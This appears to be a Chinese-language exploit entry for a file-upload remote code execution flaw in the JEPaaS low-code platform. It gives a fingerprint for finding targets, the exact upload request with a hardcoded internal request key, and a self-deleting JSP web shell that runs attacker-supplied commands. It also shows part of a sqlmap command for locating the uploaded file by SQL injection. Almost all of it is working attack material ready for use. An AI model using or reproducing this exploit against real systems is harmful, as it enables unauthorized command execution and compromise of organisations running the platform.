# JEPaaS低代码平台documentfile文件上传致RCE漏洞

- **系统**：JEPaaS　|　**类型**：命令执行　|　**CVE**：—
- **指纹**：`icon_hash="-999810473"`
- **请求**：`POST /je/document/file?bucket=webroot HTTP/1.1`
- **关键头**：`internalRequestKey: schedule_898901212`　`Content-Type: multipart/form-data; boundary=----21909179191068471382830692…`

**请求体 / payload**
```
------21909179191068471382830692394
Content-Disposition: form-data; name="files"; filename="rce.jsp"
Content-Type: image/jpeg
<% java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("cmd")).getInputStream();int a = -1;byte[] b = new byte[2048];out.print("<pre>");while((a=in.read(b))!=-1){out.println(new String(b,0,a));}out.print("</pre>");new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
------21909179191068471382830692394--
文件上传后没有回显路径，需利用SQL注入 寻找上传路径，文件默认是上传至数据库: jepaas的 je_document_file表中（需根据实际环境调整）
python3 sqlmap.py -r 注入数据包.txt --level 3 -D…（脚本共 669 字，完整版见原文）
```